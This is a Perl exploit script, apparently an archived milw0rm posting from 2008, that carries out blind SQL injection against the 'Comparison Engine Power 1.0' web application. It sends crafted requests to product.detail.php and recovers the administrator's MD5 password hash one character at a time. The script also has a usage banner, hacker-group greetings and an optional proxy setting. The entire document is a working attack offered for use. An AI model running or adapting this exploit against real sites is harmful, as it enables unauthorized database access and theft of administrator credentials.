#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;
if(!$ARGV[1])
{
  print "                                                                  \n";
  print "   ################## VIVA ISLAME VIVA ISLAME ####################\n";
  print "   ################## VIVA ISLAME VIVA ISLAME ####################\n";
  print "   ##                                                           ##\n";
  print "   ##   Comparison Engine Power 1.0 Blind SQL Injection Exploit ##\n";
  print "   ##                                                           ##\n";
  print "   ##   Author: Mr.SQL                                          ##\n";
  print "   ##   EMAIL : SQL(at)HOTMAIL.IT                               ##\n";
  print "   ##   HOME  : WwW.PaL-HaCkEr.CoM                              ##\n";
  print "   ##                                                           ##\n";
  print "   ##              -((:: GrE3E3E3E3E3ETZz ::))-                 ##\n";
  print "   ##                                                           ##\n";
  print "   ## - HaCkEr_EGy - His0k4 - Dark MaSTer - MoHaMaD AL 3rab -   ##\n";
  print "   ##              - ALwHeD -  HeBarIeH   -                     ##\n";
  print "   ##                                                           ##\n";
  print "   ##               <<>>   MuSliMs HaCkErS   <<>>               ##\n";
  print "   ##                                                           ##\n";
  print "   ##   Usage  : perl exploit.pl host                           ##\n";
  print "   ##   Example: perl exploit.pl www.host.com / -d 10           ##\n";
  print "   ##                                                           ##\n";
  print "   ##   Options:                                                ##\n";
  print "   ##     -d    valid id  value                                 ##\n";
  print "   ##   Note:                                                   ##\n";
  print "   ##   Don't forget to change the match if you have to do it   ##\n";
  print "   ##                                                           ##\n";
  print "   ###############################################################\n";
  print "   ###############################################################\n";
  exit;
}
my $host   = $ARGV[0];
my $path   = $ARGV[1];
my $userid = 1;
my $id     = $ARGV[2];
my %options = ();
GetOptions(\%options, "u=i", "p=s", "d=i");
print "[~] Exploiting...\n";
if($options{"u"})
{
  $userid = $options{"u"};
}
if($options{"d"})
{
  $id = $options{"d"};
}
syswrite(STDOUT, "[~] MD5-Hash: ", 14);
for(my $i = 1; $i <= 32; $i++)
{
  my $f = 0;
  my $h = 48;
  while(!$f && $h <= 57)
  {
    if(istrue2($host, $path, $userid, $id, $i, $h))
    {
      $f = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$f)
  {
    $h = 97;
    while(!$f && $h <= 122)
    {
      if(istrue2($host, $path, $userid, $id, $i, $h))
      {
        $f = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}
print "\n[~] Exploiting done\n";
sub istrue2
{
  my $host  = shift;
  my $path  = shift;
  my $uid   = shift;
  my $id    = shift;
  my $i     = shift;
  my $h     = shift;
 
  my $ua = LWP::UserAgent->new;
  my $query = "http://".$host.$path."product.detail.php?id=".$id." and (SUBSTRING((SELECT password FROM auto_admin_settings_tb LIMIT 0,1),".$i.",1))=CHAR(".$h.")";
 
  if($options{"p"})
  {
    $ua->proxy('http', "http://".$options{"p"});
  }
 
  my $resp    = $ua->get($query);
  my $content = $resp->content;
  my $regexp  = "tourterms.pdf";
 
  if($content =~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2008-06-17]